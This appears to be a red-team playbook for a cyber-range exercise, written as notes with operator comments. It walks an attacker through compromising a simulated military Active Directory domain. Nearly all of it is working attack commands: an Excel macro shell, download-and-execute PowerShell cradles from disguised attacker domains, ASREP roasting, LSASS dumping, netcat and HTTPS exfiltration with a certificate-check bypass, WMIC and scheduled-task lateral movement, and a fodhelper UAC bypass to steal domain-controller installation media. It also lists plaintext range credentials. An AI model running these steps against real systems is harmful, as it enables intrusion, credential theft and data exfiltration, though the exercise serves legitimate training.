
>[!info] Initial Access
> PAO:
>- **Username:** denise.arias
>- **Password:** `m@3b+9#q$v#U`
>- **Address:** 42.0.4.2 (PAO-S1-0)
>
>MDA:
>- **Username:** bryon.ball
>- **Password:** `qBy6@3gL+wFn`
>- **Address:** 41.0.4.3 (MDA-S1-1)

*(Note: make sure to reference [Range Info](./Range%20Info) for more verbose range & user information.)*

You are a threat actor attempting to establish a foothold on a DOD network using only living-off-the-land techniques. You have purchased credentials from a disgruntled employee and have access to RDP. 

## 1. Initial Access
---

Before we start anything we need to use our purchased VPN to connect to the network
```shell
sudo openvpn mda-vpn.ovpn
```

```
Username: remoteuser
Password: password
```

Once the VPN is establish, RDP into the S1-0 workstation using: 

```shell
# PAO-S1-0
xfreerdp /v:42.0.4.2 /u:denise.arias /p:'m@3b+9#q$v#U' /d:pao /cert-ignore +clipboard

# MDA-S1-1
xfreerdp /v:41.0.4.3 /u:bryon.ball /p:'qBy6@3gL+wFn' /d:mda /cert-ignore +clipboard
```

Begin light enumeration of the machine. Attempt to open command prompt, powershell, and the file explorer. Use the file explorer to look into Documents and examine the naming schema of the user emulation.

> [!Danger] McCann Note
> - Might need to zoom the browser below 100% to see the search bar, etc.
> - GPO unsuccessful.  PowerShell not blocked.
### Macro Execution
Open up Microsoft Office Excel 2007. Once you have it opened, we need to enable the developer tab, create a macro, and attach a button to it.

> [!danger] McCann Note
> - Open Excel
> 	- New Document (Blank)
> 	- Settings --> Trust Center --> Trust Center Settings --> Macro Settings --> Trust VBA...
> - Create Macro via: `View --> Macros --> Create --> 'excelmacro'`
> - Execute without button via: `View --> Macros --> View Macros --> Run`

Delete all of the text in the macro development window and paste the code below.

>[!warning] Range Issues
>You may not be able to simply send text to the RDP session using the send text command. If the copy-pasted text ends up in your terminal window, try moving the FreeRDP window to workspace 2 using alt + shift + 2. Then click on the window and try again. It will be mangled when you paste it, but it should work.

- The following macro will take commands from Cell (1,1) and return output to Cell (2,1)

```vb
Sub excelmacro()
    Set wsShell = CreateObject("Wscript.Shell")
	Dim command As String
	Dim result As String
	Dim shellout As String
	
	command = Cells(1, 1)

	shellout = wsShell.Exec("cmd.exe /c " & command).stdout.readall()

	Cells(2, 1) = shellout
	FileNumber = FreeFile
	Open "./test.xls" For Output As FileNumber
		Print #FileNumber, shellout
	Close FileNumber
End Sub
```

> [!danger] McCann Note
> Make sure the `cmd.exe /c` command (within the `shellout` variable) has a space after it, otherwise the command will fail to execute.

>[!warning] PCTE Issues
>Make sure there is only one `End Sub` in the macro. Sometimes Windows will add in a new `End Sub`, but it will error if there are multiple. If you see two of them, just delete one. 
> 
> Also, sending text to the client has a tendency to miss letters (For example `Wscript.Shel` instead of `Wscript.shell`). There is a very high chance that you are going to have to go through and clean up the script, so it may be easier to just type it in manually.

Click the save button and exit out of the macro editor.

![[Create-2007-Macro.mp4]]

Now you need to make a button to trigger the macro. In the developer tab, click on `Insert > Button (First option)`, then click somewhere on the screen. In the popup window, select `excelmacro`, then `OK`.

![[2007-Macro-Demonstration.mp4]]

We want to find a way to execute powershell, so place the command `where /r C:\ *powershell.exe ` into Cell (1,1) and then hit the button you created.

In the output, you should see `C:\Windows\WinSxS\amd64_microsoft-windows-powershell-exe_31bf3856ad364e35_10.0.19041.1_none_1f070c37a129029ff/powershell.exe`. Open up the macro editor again and replace the `shellout = ...` line with the following:

```vb
shellout = wsShell.Exec("cmd.exe /c C:\Windows\WinSxS\amd64_microsoft-windows-powershell-exe_31bf3856ad364e35_10.0.19041.1_none_1f070c37a19029ff/powershell.exe " & command).stdout.readall()
```


Make sure you have the correct file path by running `ls` in Cell (1,1)

## 2. Discovery
---

We are now going to enumerate active directory using [adpeas.ps1.](https://github.com/61106960/adPEAS/blob/main/adPEAS.ps1) Switch to a new workstation on your kali box using `alt + 3` (or any other number) and then using `alt + enter`. Begin hosting a python web server using `python3 -m http.server 80`.

>[!info] Change the following FQDN to match your plan.

> [!danger] McCann Notes
> - Using `www.google.com.co`
> 	- Renamed `adpeas.ps1` to `maps`
> 	- Renamed `asreproast.ps1` to `analytics`
> - Using `video.memezilla.com.cn`
> 	- Renamed `fodhelper.ps1` to `watchv=1qaz2wsx3edc`
> 	- Renamed `runas.ps1` to `watchv=1z2x3c4v5b6n`

```shell
# On Kali 2 (System hosting payloads)
cd scripts
cp adpeas.ps1 maps
cp asreproast.ps1 analytics
cp fodhelper.ps1 watchv=1qaz2wsx3edc
cp runas.ps1 watchv=1z2x3c4v5b6n
python -m http.server 80
```

Enter this command into Cell (1,1)
```powershell
iex ([System.Net.WebClient]::new().DownloadString('http://youztubi.com.pa/adpeas.ps1')); invoke-adpeas
```
And run the macro. It will take a moment.

The results of the file will be too large to fit into a single excel cell, but you can find them in the file you renamed from `test.xls` in the `C:\Users\denise.arias\Documents` folder.

When you have found the file you are looking for, right click it and open it with notepad. From there, you can hit `CTRL + a` and then right-click copy it to the clipboard. Now move to a new workspace by pressing `alt + <number>` on your kali box, create a new file, and paste the results into it.

You should now have the results of adpeas back on your box for you to look through. It should show you that the `webmin` account is [asreproastable.](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproast) We now have an avenue of privilege escalation, but before we move on we need to do some more network enumeration.

Run the following command to get a list of computer names, copy and paste this back into your kali box.
```powershell
([adsisearcher]'objectcategory=computer').findall()
```

This will result in a list of computer names attached to the domain. Copy and paste this information back to your attacker box.

Run `nslookup.exe pao-s6-0`. This will result in the IP address of your next target.

### ASREP Roasting

Host asreproast.ps1 on your kali box using `python3 -m http.server 80` and execute it with this powershell command. Remember to change the url to match your scenario.

``` powershell
iex([System.Net.WebClient]::new().DownloadString('http://youztubi.com.pa/asreproast.ps1')); (invoke-asreproast -Domain mda.mil).hash
```

You should now have webmin's hash. Copy and paste this from the compromised workstation back to your kali box and crack the hash with John using the following:

`john --wordlist=./rockyou.txt ./<hashtextfile>`

Which should crack the following:

`P@ssw0rd!`

### Lateral Movement

We now have to give ourselves the ability to access the S1 hosts over RDP. Host the `runas.ps1` script on the kali box using `python3 -m http.server 80`. This script will allow you to execute a command as another user using a com object. (It basically just types in the command for you for a true excel only run)

Once the file is being hosted, run the following in Cell (1,1)

```powershell
# PAO
iex ([System.Net.WebClient]::new().DownloadString('http://youztubi.com.pa/watchv=1z2x3c4v5b6n')); invoke-runas pao\webmin P@ssw0rd! '\"Net group S6_Users denise.arias /ADD /domain\"'

# MDA
iex ([System.Net.WebClient]::new().DownloadString('http://video.memezilla.com.cn/watchv=1z2x3c4v5b6n')); invoke-runas mda\webmin P@ssw0rd! '\"net group S6_Users bryon.ball /ADD /domain\"'
```

Wait 30 seconds and the command should complete successfully. You can check your groups using `whoami /all` in Cell (1,1) and open up the output `.xls` file in notepad.

>[!warning] Troubleshooting
> If `whoami /all` does not show denise.arias, try `net group S6_users /domain`

Using the same credentials you used for initial access and the result of the `nslookup` command into the S6 box from earlier (denise.arias), we should now be able to xfreerdp into a new box like this:

```bash
# PAO-S6-0
xfreerdp /v:42.0.8.2 /u:denise.arias /p:'m@3b+9#q$v#U' /d:pao /cert-ignore +clipboard

# MDA-S6-1
xfreerdp /v:41.0.8.3 /u:bryon.ball /p:'qBy6@3gL+wFn' /d:mda /cert-ignore +clipboard
```

## 3. Local Privilege Escalation
---

### Dump LSASS

> [!info] Overview
> Dump LSASS via the Task Manager GUI and extract it unencrypted over port 80 via PowerShell `Invoke-WebRequest (IWR)`, OR extract is encrypted over 443 via `[System.Net.WebClient]`.

In the search bar in the bottom left, open up `taskmgr.exe` by typing in Task Manager and right-click running it as Administrator. Search for `Local Security Authority Process` (The PID should be around 650).

When you find it, right click the process and select dump. This will output a file into `C:\Users\denise.arias\AppData\Local\Temp\lsass.DMP`. Navigate there and rename the dump file to `wmdat.tmp`. Right click the file and select `Send To > Compressed File`. Name it `wmdat.zip` and delete `wmdat.tmp`.

Now start a netcat listener on your kali box using `nc -lvp <port> > dumpfile.zip`. Now, on the Windows box, open PowerShell and upload it using `iwr http://youztubi.com.pa:<port> -usebasicparsing -method post -infile wmdat.zip`. 

> [!danger] McCann Note
> Below contains two methods of extraction. Up to the operator for which to do.

- **Method 1**: Unencrypted Exfil using HTTP
```powershell
# Attacker: Setup Listener
# Note: using port 80 allows us to not have to specify a port when using HTTP.
nc -nlvp 80 > dumpfile.zip


# Victim: Upload Dump Unencrypted
iwr http://youztubi.com.pa -usebasicparsing -method post -infile wmdat.zip
# Note: you should be in the same directory as the `wmdat.zip` file.
```

- **Method 2**: Encrypted Exfil over HTTPS (using self-signed certificates)
```powershell
# Attacker: Setup Encrypted Listener
# Note: using port 443 allows us to not have to specify a port when using HTTPS.
ncat -nlvp 443 --ssl > dumpfile.zip


# Victim: Add a self-signed certificate bypass to the current terminal
# Note: might be too large to copy and paste.
$Bypass = @'
using System;
using System.Net;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
public class SelfSignedCerts
{
    public static void Bypass()
    {
        ServicePointManager.ServerCertificateValidationCallback =
            delegate (Object obj, X509Certificate certificate, X509Chain chain, SslPolicyErrors errors)
            {
                return true;
            };
    }
}
'@
Add-Type $Bypass; [SelfSignedCerts]::Bypass()

# Victim: Upload Archive File to Attacker
# Note: you should be in the same directory as the `wmdat.zip` file.
[System.Net.WebClient]::new().UploadFile("https://www.google.com.co","$PWD\wmdat.zip")
```

Once exfilled, you can unzip the dump and export the hashes stored.

> [!danger] McCann Note
> If `pypykatz` is not updated, so you'll need to update it using the `pypykatz-deps.zip` contained in this plan's `tools` directory.
> - Download to Kali box.
> - Unzip.
> - Read installation instructions.

- On Attacker:
```shell
# Uncompress Extracted Archive
unzip dumpfile.zip

# Export hashes stored in LSASS's process memory to a file
pypykatz lsa minidump <lsass_dump> > hashes.txt
```

### Cracking Hashes

After you have the `dumpfile.zip` box fully transferred back to the kali box (it may take a second),  unzip the file using `unzip dumpfile.zip`. You should be left with `wmdat.tmp`. Now run `pypykatz lsa minidump ./wmdat.tmp > lsass`. You should now be able to read the dump with `less lsass` and read a plain-text password for the Administrator account.

It should show as `Simspace1!Simspace1!`.

> [!danger] McCann Note
> The reason the dump shows the password in cleartext is because WDigest was enabled in the registry.

Now that you have the administrator password, simply RDP back into the box as Administrator using the following command:

```bash
xfreerdp /v:42.0.8.3 /u:Administrator /p:'Simspace1!Simspace1!' /cert-ignore +clipboard
```
Once on the box as Administrator, open up PowerShell as Administrator.

Consulting the list of computer names from you pulled back earlier, find the computer name `pao-shrpt`. Determine the address of the sharepoint server using `nslookup pao-shrpt`.


>[!info]- Deviation
>At this point in time, you are able to use nslookup and the list of computer names from before to find other targets. You can use the wmic command from below to move laterally to those targets if needed.

Using the address for `pao-shrpt` and the PowerShell session you have open, run the following command.

```powershell
# Remote WMIC Command on pao-shrpt
wmic /node:42.0.2.4 process call create 'powershell.exe rundll32 C:\windows\system32\comsvcs.dll MiniDump $((get-process -name lsass).id) C:\Users\Public\downloads\sysinternals.zip full'
```

Once this completes, we are going to compress it like such:

```powershell
wmic /node:42.0.2.4 process call create 'powershell.exe compress-archive C:\Users\Public\Downloads\sysinternals.zip C:\users\public\downloads\sysmon.zip'
```

Start another netcat listener on your kali box using `nc -lvp <port> > dumpfile.zip` and then run the following command to exfiltrate lsass again:

```powershell
wmic /node:42.0.2.4 process call create 'powershell.exe iwr http://youztubi.com.pa -usebasicparsing -method post  -infile C:\Users\Public\Downloads\sysmon.zip'
```

This command may take a second to execute,  give it a minute before you stop the netcat connection and check the file.

Unzip the file using `unzip dumpfile.zip` and pass the result into pypykatz just as before, using `pypykayz lsa minidump ./sysinternals.zip > lsass-shrpt`.

You can now read this lsass dump with `less lsass-shrpt` and look for the credentials of `zander.kirk`. You should find them in plaintext as `x#i+aE5+7M6r`, and by consulting the results of adpeas you can verify that he is a domain administrator.

## 4. Exfiltration
---

We are now going to own the DC because it just feels so good, and from here we are going to extract installation media. 

Connect to the S6 box as `zander.kirk` over RDP using the following command:

```bash
# RDP into S6-0 box
xfreerdp /v:42.0.8.2 /u:terry.todd /p:'H3pEa+R2v$Q5' /d:pao /cert-ignore +clipboard
```


Then open a PowerShell session as Administrator and use the following commands:
```powershell
# Create a directory on DC1 at designatred time.
schtasks /create /TN makedir /S PAO-DC1 /U pao\terry.todd /p 'H3pEa+R2v$Q5' /SC Once /TR 'cmd.exe /c mkdir C:\temp' /ST <time>
```

`<time>` is in the format of HH:MM in military time. So for example, `09:30` for 9:30 AM, or `15:45` for 3:45 PM.

> [!danger] McCann Note
> What is the above command for? `fodhelper.ps1` also creates `C:\Temp`. 
> Feel free to skip the above command and just do the following one.

>[!warn] Foldhelper should be renamed to something less malicious. Going forward, it will remain fodhelper.ps1 for clarity.

Now host the `fodhelper.ps1` script on your kali box using `python3 -m http.server 80`. Execute it using the following:

```powershell
# Fodhelper UAC bypass to create a local backup of current Active Directory instance.
schtasks /create /TN installmedia /S PAO-DC1 /RU pao\terry.todd /RP 'H3pEa+R2v$Q5' /SC Once /TR 'powershell.exe iwr http://youztubi.com.pa/fodhelper.ps1 -usebasicparsing | iex; get-childltem' /ST <time>
```

This will execute a UAC bypass to create installation media on the target host.

>[!warn] There is no typo in the above command, you are running `getchildltem` with an `L` instead of an `I`. This is the name of the function inside of fodhelper.ps1. When the `get-childltem` function is invoked, it will perform a UAC bypass to create the installation media to exfiltrate.

Compress the installation media like such:
```powershell
# Compress installation media to a files.zip file
schtasks /create /TN compression /S PAO-DC1 /RU pao\terry.todd /RP 'H3pEa+R2v$Q5' /SC Once /TR "powershell.exe compress-archive C:\temp C:\Users\terry.todd\Downloads\files.zip" /ST <time>
```

Start a netcat listener on the kali box using `nc -lvp <port> > installmedia.zip` and exfiltrate the compressed file using:

- Attacker
```shell
# Setup a listener to exfil
ncat -nlvp 80 > installmedia.zip
```

- Victim
```Powershell
# Extract the created AD installation backup
schtasks /create /TN download /S PAO-DC1 /RU pao\terry.todd /RP 'H3pEa+R2v$Q5' /SC Once /TR "powershell.exe iwr http://youztubi.com.pa:<port> -usebasicparsing -method post -infile C:\users\terry.todd\downloads\files.zip" /ST <time>
```

You have now stolen the installation media from the DC, giving you the credentials used to create the machine. You do not have to do anything with this information, it is just useful to have.

